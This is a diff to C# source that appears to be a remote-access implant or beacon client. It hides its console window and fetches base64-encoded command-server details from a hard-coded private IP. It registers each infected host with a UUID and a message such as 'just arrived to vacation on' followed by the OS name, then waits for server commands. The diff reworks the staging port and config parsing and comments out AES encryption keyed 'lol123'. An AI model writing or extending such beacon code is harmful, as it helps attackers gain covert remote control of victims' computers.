@@ -19,7 +19,9 @@ namespace cevsn
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
 
-        public static String URL = "http://192.168.62.131:8082/initialRSA.txt";
+        public static int FILEPORT = 8000;
+
+        public static String URL = "http://192.168.62.131:"+FILEPORT+"/initial.txt";
         public static String UUID = Guid.NewGuid().ToString();
         public volatile static byte[] iv = new byte[16];
         public volatile static string Key = "";
@@ -63,11 +65,11 @@ namespace cevsn
                 {
                     while(gotHostInformation == false)
                     {
-                        URL = "http://192.168.62.131:8082/"+UUID+".txt";
+                        URL = "http://192.168.62.131:"+FILEPORT+"/"+UUID+".txt";
                         cont = getContent();
                         if(cont == "")
                         {
-                            URL = "http://192.168.62.131:8082/initialRSA.txt";
+                            URL = "http://192.168.62.131:"+FILEPORT+"/initial.txt";
                             Update();
                         } else {
                             parseHostInformation(cont);
@@ -107,8 +109,9 @@ namespace cevsn
                                         {
                                             Console.Write("Sending to Server first Conn!\n");
                                             tevsn.Send(UUID + ": just arrived to vacation on: " + osName);
-                                            URL = "http://"+IP+":8082/"+UUID+".txt";
-                                            Thread.Sleep(5000);
+                                            //URL = "http://"+IP+":"+FILEPORT+"/"+UUID+".txt";
+                                            //Thread.Sleep(5000);
+                                            /*
                                             try
                                             {
                                                 Update();
@@ -116,6 +119,7 @@ namespace cevsn
                                             } catch (Exception) {
                                                 Console.Write("Failed to get private key!\n");
                                             }
+                                            */
                                             string recv1 = tevsn.Receive();
                                             if (recv1.Equals("reviveTime")) {
                                                 IsConnected = tevsn.IsConnected();
@@ -278,11 +282,12 @@ namespace cevsn
         public static void parseHostInformation(string content) {
             if(content != "")
             {
-                string[] lines = content.Split(';');
-                IP = lines[0];
-                PORT = Int32.Parse(lines[1]);
-                Type = Encoding.UTF8.GetString(Convert.FromBase64String(lines[2]));
-                iv = Convert.FromBase64String(lines[3]);
+                string[] lines = Encoding.UTF8.GetString(Convert.FromBase64String(content)).Split(';');
+                Console.Write(Encoding.UTF8.GetString(Convert.FromBase64String(content)));
+                IP = lines[1];
+                PORT = Int32.Parse(lines[2]);
+                Type = lines[3];
+                //iv = lines[3];
                 /*
                 if(lines.Length > 4)
                 {
@@ -297,9 +302,10 @@ namespace cevsn
         public static Tevsn CreateTevsn(string ip, int port, string key, string os)
         {
             //rsa = new encrn.rsa.RSA(key);
-            aes = new AES("lol123", iv);
+            //aes = new AES("lol123", iv);
             Console.Write(ip + "\n");
-            return new Tevsn(ip, port, aes, os);
+            //return new Tevsn(ip, port, aes, os);
+            return new Tevsn(ip, port, os);
         }
         
     }
